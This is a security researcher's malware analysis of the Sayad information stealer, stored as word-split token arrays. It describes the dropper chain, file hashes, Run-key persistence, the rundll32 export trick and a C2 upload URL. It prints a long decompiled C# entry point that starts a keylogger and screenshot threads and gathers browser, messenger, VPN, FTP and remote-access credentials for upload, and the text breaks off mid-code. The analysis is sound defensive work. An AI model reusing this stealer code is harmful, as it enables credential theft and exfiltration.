"Chrome", ",", "Firefox", ",", "Internet", "Explorer", ",", "and", "Opera"], ["Steal", "browser", "cookies", "for", "Chrome", ",", "Firefox", ",", "Internet", "Explorer", ",", "and", "Opera"], ["Collect", "and", "transfer", "history", "for", "Chrome", ",", "Firefox", ",", "Internet", "Explorer", ",", "and", "Opera", "Capture", "any", "registered", "proxies"], ["Get", "and", "transfer", "the", "start", "URL", "for", "each", "installed", "browser"], ["Collect", "and", "transfer", "chat", "history", "for", "Skype", ",", "Yahoo", "Messenger", ",", "Pidgin", ",", "and", "GTalk", "Steal", "RDP", ",", "Putty", "accounts"], ["Collect", "VPN", "related", "account", "information", "for", "Proxifier", "and", "WinVPN"], ["Determine", "if", "the", "currently", "logged", "on", "user", "is", "running", "as", "admin"], ["At", "the", "time", "of", "writing", "of", "this", "post", ",", "the", "detection", "rate", "for", "Sayad", "malware", "binary"], ["(", "SHA2:8904836017bc20972a769f8d4d6bee08388da3d0f83e362e67f9f0b6b1ae5c12", ")", "at", "VirusTotal", "is", "zero", "."], ["There", "are", "several", "interesting", "aspects", "of", "Sayad", "malware", ",", "and", "after", "running", "the", "malicious", "executable", "through", "the", "Vinsula", "Execution", "Engine", "to", "analyze", "its", "behavior", ",", "I", "discovered", "that", "the", "initial", "executable", "titled", "WEXTRACT.exe"], ["(", "SHA1:1c52b749403d3f229636f07b0040eb17beba28e4", ")", "was", "in", "fact", "a", "self", "extracting", "EXE", "that", "dropped", "and", "launched", "the", "Binder", "executable", "malware", ",", "~8f60957b3689075fa093b047242c0255.exe"], ["(", "SHA1:69fd05ca3a7514ea79480d1dbb358fab391e738d", ")", "."], ["Once", "the", "Binder", "executable", "malware", "is", "launched", ",", "it", "checks", "the", ".NET", "version", "installed", "on", "the", "machine", "and", "drops", "the", "information", "stealer", "DLL", "component", ",", "Sayad", "(", "aka", "Client", ")", "\u2013", "DiagnosticsService.dll", "(", "SHA1:8521eefbf7336df5c275c3da4b61c94062fafdda", ")", "."], ["Sayad", "has", "some", "characteristics", "that", "make", "it", "unique", ":"], ["Sayad", "has", "been", "designed", "by", "someone", "who", "seems", "to", "have", "a", ".NET"], ["OOP", "/", "OOD", "background"], ["It", "uses", "some", "non", "-", "traditional", "methods", "for", "native", "to", ".NET"], ["interop", "like", "exporting", "a", "manged", "API", "through", "the", "native", "Export", "Address", "Table"], ["The", "malware", "uses", "an", "oversimplified", "form", "of", "obfuscation", "for", "string", "utilizing", "Base64", "encoding", "which", "in", "fact", "can", "be", "easily", "de", "-", "obfuscated"], ["Our", "collegues", "from", "NCC", "Group", "\u2019s", "Cyber", "Defence", "Operations", "published", "an", "article", "titled", "\u201c", "A", "new", "Flying", "Kitten", "?", "\u201d"], ["with", "some", "details", "around", "Sayad", "malware", "and", "its", "possible", "link", "to", "the", "activities", "of", "the", "Iranian", "hacking", "group", "\u201c", "Ajax", "Security", "Team", ".", "\u201d"], ["Attack", "Overview"], ["The", "diagram", "below", "outlines", "the", "key", "elements", "of", "the", "attack", "."], ["The", "malware", "executable", "is", "delivered", "by", "a", "phishing", "email", "or", "the", "user", "is", "somehow", "tricked", "into", "downloading", "it", "and", "executing", "it", "."], ["Once", "the", "user", "clicks", "on", "the", "malware", ",", "it", "extracts", "the", "actual", "malware", "executable", "and", "launches", "it", "."], ["Analysis"], ["Our", "first", "step", "was", "to", "run", "the", "\u201c", "Sayad", "\u201d", "binary", "through", "our", "Vinsula", "Execution", "Engine", "to", "find", "out", "just", "what", "it", "does", "."], ["The", "process", "tree", "below", "as", "reported", "by", "our", "engine", "allows", "us", "to", "visually", "present", "the", "parent", "/", "child", "relationship", "between", "all", "the", "processes", "and", "their", "command", "lines", "related", "to", "the", "execution", "for", "this", "specific", "malware", "."], ["explorer.exe", "[", "Process", "I", "d", ":", "140", "]", "+", "WEXTRACT.exe"], ["[", "Process", "I", "d", ":", "3508", "]", "+", "~8f60957b3689075fa093b047242c0255.exe"], ["[", "Process", "I", "d", ":", "2544", "]", "+", "rundll32.exe"], ["[", "Process", "I", "d", ":", "2596", "]"], ["Cmd", "line", ":", "rundll32.exe", "\"", "DiagnosticsService.dll\",78121", "+", "csc.exe", "[", "Process", "I", "d", ":", "2672", "]", "+", "cvtres.exe", "[", "Process", "I", "d", ":", "256", "]", "+", "csc.exe", "[", "Process", "I", "d", ":", "3548", "]", "+", "cvtres.exe", "[", "Process", "I", "d", ":", "3280", "]"], ["For", "the", "sake", "of", "shortness", ",", "in", "this", "post", "we", "omit", "the", "command", "line", "details", "in", "the", "process", "tree", "above", "for", "the", "csc.exe", "and", "cvtres.exe", "instances", "."], ["For", "the", "same", "reason", ",", "we", "also", "do", "n\u2019t", "show", "the", "complete", "command", "line", "of", "the", "rundll32.exe", "."], ["Because", "this", "is", "an", "important", "detail", ",", "here", "is", "how", "it", "shows", "up", "in", "our", "Vinsula", "malware", "report", ":"], ["rundll32.exe", "\u201c", "C:\\Users\\[User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll\u201d,78121", "Sayad", "malware", "is", "a", "self", "-", "contained", "executable", "that", "embeds", "within", "itself", "all", "the", "required", "malicious", "components", ",", "meaning", "that", "it", "does", "n\u2019t", "need", "to", "download", "any", "additional", "malicious", "content", "from", "the", "C2", "server", ",", "which", "may", "appear", "suspicious", "."], ["Its", "three", "core", "components", "are", "structured", "as", "\u201c", "Russian", "Dolls", ",", "\u201d", "i.e.", ",", "one", "wrapped", "within", "the", "next", "in", "layers", "."], ["Here", "is", "the", "list", "with", "the", "key", "components", "starting", "from", "the", "outermost", "one", "."], ["Hashes", "of", "all", "investigated", "components", "are", "provided", "at", "the", "end", "of", "this", "post", "."], ["Self", "-", "extracting", "executable", "(", "WEXTRACT.exe", ")"], ["Binder", "(", "~8f60957b3689075fa093b047242c0255.exe", ")"], ["Client", "(", "DiagnosticsService.dll", ")"], ["Further", "down", ",", "I", "will", "go", "into", "greater", "detail", "and", "provide", "more", "information", "about", "the", "behavior", "and", "static", "building", "blocks", "of", "each", "of", "these", "components", "."], ["For", "now", ",", "I", "am", "just", "aiming", "to", "capture", "the", "scope", "of", "each", "executable", "involved", "in", "the", "orchestration", "of", "the", "Sayad", "malware", "."], ["As", "we", "can", "see", "in", "the", "cascade", "tree", "above", ",", "the", "main", "malware", "WEXTRACT.exe", "is", "a", "self", "-", "extracting", "executable", "which", "extracts", "the", "Binder", "~8f60957b3689075fa093b047242c0255.exe", ",", "and", "it", "then", "launches", "it", "."], ["The", "Binder", "is", "responsible", "for", "checking", "the", "installed", ".NET"], ["version", "and", "extracting", "the", "relevant", ".NET"], ["Client", "\u2013", "DiagnosticsService.dll", "."], ["This", ".NET"], ["DLL", "implements", "the", "data", "collecting", "logic", "and", "sends", "the", "collected", "data", "to", "the", "C2", "server", "."], ["The", "following", "diagram", "captures", "a", "bit", "more", "of", "the", "detail", "of", "the", "malware", "workflow", "."], ["The", "main", "self", "-", "extracting", "binary", "WEXTRACT.exe", "drops", "two", "files", "in", "the", "user", "\u2019s", "appdata", "temp", "directory", "as", "shown", "in", "the", "following", "entries", "from", "our", "Vinsula", "report", "."], ["These", "two", "files", "are", "the", "two", "parts", "of", "the", "Binder", "\u2013", "a", ".NET"], ["executable", "(", "~8f60957b3689075fa093b047242c0255.exe", ")", "and", "its", "configuration", "file", "(", "~8f60957b3689075fa093b047242c0255.exe.config", ")", "."], ["Details", "along", "with", "snippets", "from", "Binder", "\u2019s", "source", "code", "are", "provided", "in", "the", "next", "sections", "."], ["+", "WEXTRACT.exe"], ["[", "Process", "I", "d", ":", "3508", "]"], ["Create[C:\\Users\\"], ["[", "User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe", "]"], ["Delete[C:\\Users\\"], ["[", "User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe", "]", "Open[C:\\Users\\"], ["[", "User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe", "]", "Write[C:\\Users\\"], ["[", "User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe", "]"], ["Create[C:\\Users\\"], ["[", "User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe.config", "]"], ["Delete[C:\\Users\\"], ["[", "User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe.config", "]", "Open[C:\\Users\\"], ["[", "User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe.config", "]"], ["Write[C:\\Users\\"], ["[", "User]\\AppData\\Local\\Temp\\IXP000.TMP\\~8f60957b3689075fa093b047242c0255.exe.config", "]"], ["Here", "is", "the", "hashes", "of", "the", "Binder", ":"], ["Filename", ":", "~8f60957b3689075fa093b047242c0255.exe", "MD5", ":", "72641dedb31280b78bf6a0f184ef29b6", "SHA1", ":", "69fd05ca3a7514ea79480d1dbb358fab391e738d"], ["This", "is", "what", "the", "two", "files", "dropped", "by", "the", "self", "-", "extracting", "malware", "look", "like", "in", "Windows", "Explorer", "."], ["They", "are", "stored", "in", "a", "temporary", "location", "C:\\Users\\[User]\\AppData\\Local\\Temp\\IXP000.TMP", "."], ["After", "dropping", "the", "Binder", "and", "its", "configuration", "file", ",", "the", "main", "self", "-", "extracting", "binary", "launches", "the", "Binder", "(", "~8f60957b3689075fa093b047242c0255.exe", ")", "."], ["Similar", "to", "the", "process", "tree", "from", "our", "Vinsula", "report", "above", ",", "the", "below", "screenshot", "from", "Process", "Explorer", "shows", "the", "Binder", "being", "launched", "by", "the", "self", "-", "extracting", "binary", "."], ["The", "purpose", "of", "the", "Binder", "is", "to", "create", "and", "drop", "the", "core", "malware", "component", "(", "also", "titled", "Client", "\u2013", "DiagnosticsService.dll", ")", "and", "its", "configuration", "disguised", "as", "a", "DLL", "file", ",", "base.dll", "."], ["Below", "is", "a", "snippet", "from", "our", "Vinsula", "report", "capturing", "the", "relevant", "event", "entries", "that", "show", "the", "Client", "and", "its", "configuration", "being", "created", "."], ["+", "WEXTRACT.exe"], ["[", "Process", "I", "d", ":", "3508", "]", "+", "~8f60957b3689075fa093b047242c0255.exe"], ["[", "Process", "I", "d", ":", "2544", "]"], ["Create", "[", "C:\\Users\\[User]\\AppData\\Roaming\\Client\\base.dll", "]", "Write", "[", "C:\\Users\\[User]\\AppData\\Roaming\\Client\\base.dll", "]"], ["Create", "[", "C:\\Users\\"], ["[", "User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll", "]", "Write", "[", "C:\\Users\\"], ["[", "User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll", "]"], ["These", "are", "the", "hashes", "of", "the", "two", "core", "Client", "related", "files", ":"], ["Filename", ":", "DiagnosticsService.dll", "MD5", ":", "432a79f8f1402cb2622b27e26e900d55"], ["SHA1", ":", "8521eefbf7336df5c275c3da4b61c94062fafdda"], ["Filename", ":", "base.dll", "MD5", ":", "4a67b19c02d5cfdebcd85b7395d09881"], ["SHA1", ":", "082da03918039125dcf1f096a13ffa9ab6a56bde"], ["Before", "digging", "into", "the", "details", "of", "the", "Client", ",", "lets", "have", "a", "look", "at", "the", "Binder", "\u2019s", "(", "~8f60957b3689075fa093b047242c0255.exe", ")", "implementation", "."], ["The", "Binder", "is", "a", ".NET", "executable", "whose", "purpose", "is", "to", "find", "out", "what", "version", "of", ".NET", "is", "currently", "installed", ",", "and", "then", "drop", "the", "relevant", ".NET"], ["Client", "DLL", "accordingly", "."], ["There", "are", "two", "versions", "of", "the", "Client", "DLL", "that", "are", "stored", "as", "embedded", "resources", "in", "Binder", "\u2019s", "executable", "."], ["That", "makes", "the", "malware", "less", "chattier", "and", "allows", "it", "to", "drop", "the", "correct", ".NET"], ["version", "DLL", "without", "the", "need", "to", "download", "it", "from", "a", "malicious", "Web", "location", "."], ["As", "shown", "in", "the", "above", "screenshot", ",", "in", "the", "Binder", "\u2019s", "main", "entry", "point", ",", "the", "Sayad", "malware", ":", "gets", "the", "installed", ".NET"], ["versions", "modifies", "the", "registry", "so", "that", "it", "will", "run", "at", "startup", "using", "rundll32.exe", "Windows", "utility", "to", "load", "the", "Client", "(", "DiagnosticsService.dll", ")", "extracts", "the", "relevant", ".NET"], ["Client", "version", "from", "the", "embedded", "resource", "depending", "on", "the", "installed", ".NET"], ["version", ",", "it", "copies", "the", "Client", "(", "CopySayad", "method", ")", "to", "a", "user", "\u2019s", "directory", "extract", "the", "configuration", "information", "from", "the", "end", "of", "the", "Binder", "\u2019s", "image", "using", "the", "method", "ReadExtraDataFromEndOfBuffer", "starts", "up", "the", "Client", "using", "the", "command", "rundll32.exe", "\u201c", "C:\\Users\\"], ["[", "User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll\u201d,7812", "The", "following", "diagram", "reflects", "the", "code", "paths", "in", "Binder", "\u2019s", "Main", "entry", "point", "as", "described", "in", "the", "section", "above", "."], ["The", "Binder", "ensures", "that", "the", "malware", "will", "survive", "reboots", "by", "registering", "the", "command", "for", "loading", "and", "executing", "the", "Client", "DLL", "(", "DiagnosticsService.dll", ")", "to", "run", "at", "startup", "as", "shown", "below", "."], ["The", "following", "shows", "the", "registry", "modification", "that", "comes", "as", "a", "result", "of", "the", "executing", "the", "code", "above", "."], ["And", "here", "is", "the", "corresponding", "registry", "modification", "entries", "from", "Vinsula", "\u2019s", "report", "."], ["More", "on", "the", "details", "regarding", "the", "rundll32.exe", "command", "will", "be", "provided", "in", "the", "following", "sections", "."], ["+", "WEXTRACT.exe"], ["[", "Process", "I", "d", ":", "3508", "]", "+", "~8f60957b3689075fa093b047242c0255.exe"], ["[", "Process", "I", "d", ":", "2544", "]"], ["Set", "Key", ":", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Name", ":", "DiagnosticsService", "Value", ":", "rundll32.exe", "\"", "C:\\[Path", "omitted]\\DiagnosticsService.dll\",78121", "+"], ["rundll32.exe"], ["[", "Process", "I", "d", ":", "2596", "]"], ["Command", ":", "rundll32.exe", "\"", "DiagnosticsService.dll\",78121", "Set", "Key", ":", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Name:78121", "Value", ":", "rundll32.exe", "\"", "C:\\Windows\\system32\\rundll32.exe\",78121"], ["An", "interesting", "aspect", "of", "the", "implementation", "of", "the", "Binder", "assembly", "is", "the", "way", "the", "malware", "authors", "decided", "to", "launch", "the", "Client", "by", "executing", "the", "command", "rundll32.exe", "\u201c", "DiagnosticsService.dll\u201d,7812", "and", "utilizing", "WinExec", "API", "to", "launch", "the", "rundll32.exe", "process", "as", "shown", "below", "."], ["The", "WinExec", "API", "has", "been", "provided", "only", "for", "backward", "compatibility", "with", "16", "-", "bit", "Windows", "."], ["A", "quick", "Googling", "of", "the", "method", "names", "of", "the", "two", "methods", "FromUrlSafeBase64String", "ToUrlSafeBase64String", "from", "the", "Base64.cs", "file", "shows", "that", "the", "code", "has", "been", "copied", "from", "the", "following", "stackoverflow", "post", "\u201c", ".NET"], ["MVC"], ["Routing", "w/", "Url", "Encoding", "Problems", "\u201d", "."], ["The", "following", "screenshot", "shows", "the", "Binder", "project", "in", "Visual", "Studio", "."], ["As", "previously", "mentioned", ",", "the", "Binder", "extracts", "the", "relevant", "Client", "DLL", "according", "to", "the", "installed", ".NET", "version", "."], ["There", "are", "two", "copies", "of", "the", "Client", "DLL", ",", "targeting", ".NET2"], ["and", ".NET4", ",", "both", "stored", "as", "embedded", "resources", "inside", "the", "Binder", "file", "image", "."], ["The", "Binder", "is", "also", "responsible", "for", "extracting", "the", "configuration", "data", "located", "at", "the", "end", "of", "the", "Binder", "\u2019s", "file", "image", "and", "storing", "it", "in", "the", "base.dll", "file", "."], ["The", "configuration", "data", "is", "stored", "as", "plain", "text", "and", "Base64", "encoded", "data", "and", "holds", "following", "configuration", "attributes", ":", "BuildId", "\u2013", "a", "unique", "GUID", "that", "identifies", "the", "build", "of", "the", "malware", "."], ["For", "this", "sample", "the", "GUID", "value", "is", "{", "e5aac039", "-", "cf4a-4b1d-9507", "-", "df7001ee2637", "}"], ["PublicKey", "\u2013", "this", "is", "a", "RSA", "public", "key", "used", "for", "encrypting", "the", "collected", "data", "being", "uploaded", "to", "the", "malicious", "Web", "site", "hxxp://0o0o0o0o0.com", "PostURL"], ["\u2013", "this", "is", "a", "URL", "and", "it", "is", "used", "for", "uploading", "collected", "data", "to", "the", "malicious", "Web", "site", "\u2013", "hxxp://0o0o0o0o0.com/soft.php"], ["ResourceURL", "\u2013", "a", "URL", "that", "the", "malware", "uses", "to", "download", "sqllite3.dll", "ScreenShotCount", "\u2013", "determines", "how", "many", "consecutive", "screenshots", "need", "to", "be", "taken", "each", "time", "ScreenShotInterval", "\u2013", "indicates", "how", "frequently", "the", "screenshots", "will", "be", "taken", "StartupScreenshot", "\u2013", "determines", "whether", "to", "take", "a", "screenshot", "at", "startup", "time"], ["Here", "is", "a", "sample", "configuration", "file", "base.dll", "The", "most", "interesting", "aspect", "of", "this", "malware", "is", "surely", "the", "Sayad", "Client", "(", "DiagnosticsService.dll", ")", "."], ["The", "malware", "authors", "decided", "to", "implement", "the", "core", "data", "collection", "and", "transmission", "into", "a", "single", ".NET"], ["DLL", "."], ["Typically", ",", "unknown", ".NET"], ["DLLs", "do", "not", "look", "as", "suspicious", "as", "a", "native", "Win32", "DLL", "or", "an", "executable", "."], ["Also", ",", "a", "DLL", "requires", "an", "executable", "to", "load", "it", "in", "order", "to", "execute", "any", "code", "implemented", "by", "the", "DLL", "."], ["Sayad", "leverages", "rundll32.exe", ",", "which", "is", "a", "shell", "that", "allows", "the", "loading", "of", "32", "-", "bit", "DLLs", "and", "the", "execution", "of", "exported", "APIs", "."], ["Basically", ",", "Sayad", "Client", "is", "a", "32", "-", "bit", ".NET"], ["DLL", "."], ["Rundll32.exe", "would", "be", "able", "to", "load", "Sayad", "Client", "DLL", ",", "but", "as", "it", "is", "a", ".NET", "managed", "DLL", "it", "does", "n\u2019t", "support", "exporting", "of", "native", "unmanaged", "APIs", ",", "thus", "Rundll32.exe", "can", "not", "execute", "any", "of", "the", ".NET", "/", "C", "#", "public", "methods", "implemented", "in", "the", "Sayad", "Client", "DLL", "."], ["Going", "back", "to", "the", "malware", "process", "tree", "we", "can", "see", "that", "Binder", "launches", "the", "following", "command", ",", "which", "is", "instructing", "Windows", "utility", "rundll32.exe", "to", "load", "Sayad", "Client", "DiagnosticsService.dll", ",", "obtain", "the", "function", "address", "of", "the", "native", "API", "named", "\u201c", "78121", "\u201d", "via", "GetProcAddress", "(", ")", ",", "and", "call", "the", "function", "pointer", "of", "the", "entry", "point", "\u201c", "78121", "\u201d", "."], ["rundll32.exe", "\"", "C:\\Users\\"], ["[", "User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll\",78121", "Microsoft", "C", "#", "compiler", "does", "not", "support", "interop", "via", "the", "export", "of", "unmanaged", "native", "APIs", "from", "within", "a", ".NET", "/", "C"], ["#", "DLL", "."], ["However", ",", "if", "we", "open", "Sayad", "Client", "DLL", "it", "is", "clear", "that", "the", "DLL", "does", "export", "a", "native", "unmanaged", "API", "function", "titled", "\u201c", "78121", "\u201d", "."], ["How", "have", "the", "malware", "authors", "managed", "to", "export", "a", "native", "API", "from", "a", "C", "#", "DLL", "?"], ["Although", "not", "supported", "by"], ["Microsoft", ",", "this", "is", "not", "impossible", "if", "after", "building", "the", "executable", ",", "the", "MSIL", "is", "modified", "to", "map", "a", "managed", "static", "method", "to", "the", "name", "of", "a", "native", "unmanaged", "API", "and", "then", "export", "the", "API", "so", "that", "it", "appears", "in", "the", "Export", "Address", "Table", "of", "the", "managed", "PE", "(", "Portable", "Executable", ")", "image", "."], ["In", "this", "case", ",", "a", "static", "method", "Main", "(", ")", "of", "Program", "class", "located", "in", "Program.cs", "of", "the", "Sayad", "Client", "DLL", "(", "DiagnosticsService.dll", ")", "maps", "to", "the", "native", "API", "\u201c", "78121", "\u201d", "."], ["As", "shown", "below", ",", "a", "special", "declaration", "is", "applied", "to", "ensure", "that", "the", "caller", "(", "rundll32.exe", ")", "executes", "a", "method", "matching", "the", "required", "_", "_", "stdcall", "calling", "convention", "."], ["Here", "is", "the", "MSIL", "of", "the", "static", "Main", "(", ")", "method", "."], ["And", "below", "is", "the", "corresponding", "disassmebled", "C", "#", "version", "."], ["Sayad", "Client", "DLL", "\u2019s", "main", "entry", "point", "initializes", "and", "starts", "up", "all", "data", "collection", "methods", "that", "the", "assembly", "implements", "."], ["The", "code", "below", "is", "executed", "by", "using", "the", "command", "rundll32.exe", "\u201c", "C:\\Users\\"], ["[", "User]\\AppData\\Roaming\\Client\\DiagnosticsService.dll\u201d,7812"], ["The", "malware", "authors", "left", "some", "debugging", "messages", "that", "indicate", "the", "different", "stages", "of", "the", "Sayad", "Client", "initialization", "."], ["The", "code", "also", "handles", "and", "collects", "all", "uncaught", "exceptions", "thrown", "during", "the", "execution", "of", "the", "malware", "by", "attaching", "to", "AppDomain", "."], ["UnhandledException", "and", "Application", "."], ["ThreadException", "events", "."], ["In", "the", "next", "step", ",", "the", "client", "loads", "the", "configuration", "discussed", "in", "a", "previous", "section", "and", "then", "proceeds", "to", "start", "up", "all", "data", "collection", "components", ",", "as", "shown", "in", "the", "snippet", "below", "."], ["private", "static", "void", "modopt(CallConvStdcall", ")", "Main", "(", ")", "{", "Application", "."], ["SetUnhandledExceptionMode", "(", "UnhandledExceptionMode", "."], ["CatchException", ")", ";", "AppDomain", "."], ["CurrentDomain", "."], ["UnhandledException", "+", "=", "new", "UnhandledExceptionEventHandler", "(", "Program", "."], ["TotalExceptionHandler", ")", ";", "Application", "."], ["ThreadException", "+", "="], ["new", "ThreadExceptionEventHandler", "(", "Program", "."], ["TotalExceptionHandler", ")"], [";", "try", "{", "bool", "flag3", ";"], ["ClientExceptions", "=", "new", "List", "<", "ExceptionSerializeModel", ">", "(", ")", ";", "_", "uploadQuque", "=", "new", "UploadQueue", "(", ")", ";", "string", "path", "=", "CommonPath", "."], ["ClientPath", "(", ")", "+", "Path", "."], ["DirectorySeparatorChar", "+", "\"", "base.dll", "\"", ";", "while", "(", "!"], ["File", "."], ["Exists(path", ")", ")"], ["{"], ["Thread", "."], ["Sleep(int", "."], ["Parse(Resources", "."], ["ShortSleepTime", ")", ")", ";", "}"], ["Debug", "."], ["Write(\"Config", "loaded", "\"", ")", ";", "string", "[", "]", "strArray", "=", "File", "."], ["ReadAllLines(path", ")", ";"], ["ExecutableConfigInfo", "info2", "=", "new", "ExecutableConfigInfo", "{", "BuildId", "=", "strArray[0].Trim", "(", ")", ",", "PublicKey", "=", "strArray[1].Trim", "(", ")", ",", "PostURL", "=", "strArray[2].Trim", "(", ")", ",", "ResourceURL", "=", "strArray[3].Trim", "(", ")", ",", "screenShotCount", "=", "strArray[4].Trim", "(", ")", ",", "screenShotInterval", "=", "strArray[5].Trim", "(", ")", ",", "startupScreenShot", "=", "strArray[6].Trim", "(", ")", "}", ";", "_", "configInfo", "=", "info2", ";", "try", "{", "if", "(", "!", "string", "."], ["IsNullOrEmpty(_configInfo", ".", "PostURL", ")", ")", "{", "Uri", "uri", "=", "new", "Uri(_configInfo", "."], ["PostURL", ")", ";", "_", "hostAddress", "=", "uri", "."], ["OriginalString", "."], ["Replace", "(", "uri", "."], ["AbsolutePath", ",", "\"", "\"", ")", ";", "}", "}", "catch", "{", "return", ";", "}", "CryptionKeyInfo"], ["info3", "=", "new", "CryptionKeyInfo", "{", "KeySize", "=", "int", "."], ["Parse(Resources", "."], ["RSAKeySize", ")", ",", "PublicKey", "=", "_", "configInfo", "."], ["PublicKey", "}", ";", "_", "keyInfo", "=", "info3", ";"], ["Debug", "."], ["Write(\"Config", "parsed", "\"", ")", ";", "if", "(", "!", "string", "."], ["IsNullOrEmpty(_hostAddress", ")", ")"], ["{", "new", "Wiper(new", "Http", "(", ")", ","], ["_", "hostAddress", ",", "_", "configInfo", "."], ["BuildId).StartWiper", "(", ")", ";", "Debug", "."], ["Write(string", "."], ["Format(\"wiper", "{", "0", "}", "\"", ",", "_", "hostAddress", ")", ")", ";", "}", "new", "StorageUploader(new", "Http", "(", ")", ",", "_", "configInfo", "."], ["PostURL", ",", "_", "configInfo", "."], ["BuildId).StartUploader", "(", ")", ";"], ["Debug", "."], ["Write(\"storage", "uploader", "\"", ")", ";"], ["new", "Updater(new", "Http", "(", ")", ",", "_", "hostAddress", ",", "_", "configInfo", "."], ["BuildId).StartUpdater", "(", ")", ";"], ["Debug", "."], ["Write(\"updater", "\"", ")", ";", "int", "keyLogLimitSize", "=", "int", "."], ["Parse", "(", "Resources", "."], ["KeyloggerLogLimitSize", ")", ";", "new", "Thread(delegate", "{", "KeyLoggerProc(new", "Http", "(", ")", ",", "keyLogLimitSize", ")", ";", "}", ")", ".Start"], ["(", ")", ";", "Debug", "."], ["Write(\"keylogger", "\"", ")", ";", "int", "screenshotCount", "=", "int", "."], ["Parse", "(", "_", "configInfo.screenShotCount", ")", ";", "int", "screenshotInterval", "=", "int", "."], ["Parse", "(", "_", "configInfo.screenShotInterval", ")", ";", "new", "Thread(delegate", "{", "ScreenShotProc(new", "Http", "(", ")", ",", "screenshotInterval", ",", "screenshotCount", ")", ";", "}", ")", ".Start"], ["(", ")", ";", "Debug", "."], ["Write(\"Screenshot", "\"", ")", ";", "Debug", "."], ["Write(_configInfo", ".", "ResourceURL", ")", ";", "if", "(", "SQLiteFinder", "."], ["FindSqlite(_configInfo", ".", "ResourceURL", ")", ")"], ["{", "Debug", "."], ["Write(\"sqlite", "found", "&", "start", "collectiong", "data", "\"", ")", ";", "SerializeModel", "dataToSerialize", "=", "NewSerializerModel", "(", ")", ";", "dataToSerialize", "."], ["MachineInfo", "="], ["new", "MachineInfo().GetMachineInfo", "(", ")", ";"], ["Debug", "."], ["Write(\"Machine", "info", "collected", "\"", ")", ";", "List", "<", "IBrowser", ">", "list", "=", "new", "List", "<", "IBrowser", ">", "{", "new", "Chrome", "(", ")", ",", "new", "Firefox", "(", ")", ",", "new", "Opera", "(", ")", "}", ";", "foreach", "(", "IBrowser", "browser", "in", "list", ")", "{", "dataToSerialize", "."], ["BrowsersInfo", "."], ["Add", "(", "browser", "."], ["GetBrowserInfo", "(", ")", ")", ";", "}"], ["Debug", "."], ["Write(\"browser", "ok", "\"", ")", ";", "List", "<", "IMessenger", ">", "list2", "=", "new", "List", "<", "IMessenger", ">", "{", "new", "Pidgin", "(", ")", ",", "new", "YahooMessenger", "(", ")", ",", "new", "Gtalk", "(", ")", "}", ";", "foreach", "(", "IMessenger", "messenger", "in", "list2", ")", "{", "dataToSerialize", "."], ["MessengersInfo", "."], ["Add", "(", "messenger", "."], ["GetMessengerInfo", "(", ")", ")", ";", "}", "Debug", "."], ["Write(\"messenger", "ok", "\"", ")", ";", "List", "<", "IVpn", ">", "list3", "=", "new", "List", "<", "IVpn", ">", "{", "new", "Proxifier", "(", ")", "}", ";", "foreach", "(", "IVpn", "vpn", "in", "list3", ")", "{", "dataToSerialize", "."], ["VpNsInfo", "."], ["Add(vpn", "."], ["GetClientInfo", "(", ")", ")", ";", "}"], ["Debug", "."], ["Write(\"vpn", "ok", "\"", ")", ";", "List", "<", "IFtpClient", ">", "list4", "=", "new", "List", "<", "IFtpClient", ">", "{", "new", "FilezillaClient", "(", ")", ",", "new", "Winscp", "(", ")", "}", ";", "foreach", "(", "IFtpClient", "client", "in", "list4", ")", "{", "dataToSerialize", "."], ["FtpClientsInfo", "."], ["Add", "(", "client", "."], ["GetFtpClientInfo", "(", ")", ")", ";", "}", "Debug", "."], ["Write(\"ftp", "client", "ok", "\"", ")"], [";", "List", "<", "IFtpServer", ">", "list5", "=", "new", "List", "<", "IFtpServer", ">", "{", "new", "FilezillaServer", "(", ")", "}", ";", "foreach", "(", "IFtpServer", "server", "in", "list5", ")", "{", "dataToSerialize", "."], ["FtpManagementsInfo", "."], ["Add", "(", "server", "."], ["GetFtpServerInfo", "(", ")", ")", ";", "}", "Debug", "."], ["Write(\"ftp", "server", "ok", "\"", ")", ";", "List", "<", "IRemoteClient", ">", "list6", "=", "new", "List", "<", "IRemoteClient", ">", "{", "new", "Putty", "(", ")", ",", "new", "RemoteDesktop", "(", ")", "}", ";", "foreach", "(", "IRemoteClient", "client2", "in", "list6", ")", "{", "dataToSerialize", "."], ["RemoteClientsInfo", "."], ["Add", "(", "client2.GetRemoteClientsInfo", "(", ")", ")", ";", "}", "Debug", "."], ["Write(\"rdp", "ok", "\"", ")", ";"], ["List", "<", "IFileCollector", ">", "list7", "=", "new", "List", "<", "IFileCollector", ">", "{", "new", "Kerio", "(", ")", "}", ";", "foreach", "(", "IFileCollector", "collector", "in", "list7", ")", "{", "dataToSerialize", "."], ["ExtraFiles", ".", "Add(collector", "."], ["GetFile", "(", ")", ")", ";", "}", "Debug", "."], ["Write(\"kerio", "ok", "\"", ")", ";", "string", "[", "]", "skypeDatabases", "=", "Skype", "."], ["GetSkypeDatabases", "(", ")", ";", "foreach", "(", "string", "str2", "in", "skypeDatabases", ")", "{", "string", "destFileName", "=", "Path", "."], ["Combine", "(", "Path", "."], ["GetTempPath", "(", ")", ",", "Path", "."], ["GetFileName(str2", ")", ")", ";"], ["File", "."], ["Copy(str2", ",", "destFileName", ")", ";", "if", "(", "File", ".", "Exists(destFileName", ")", ")"], ["{", "DirectoryInfo", "parent", "=", "new", "DirectoryInfo(str2).Parent", ";", "if", "(", "(", "parent", "!", "=", "null", ")", "&", "&", "File", "."], ["Exists(destFileName", ")", ")"], ["{", "ExtraFileSerializeModel", "item", "="], ["new", "ExtraFileSerializeModel", "{", "Name", "=", "Resources", "."], ["SkypePathName", ",", "Description", "=", 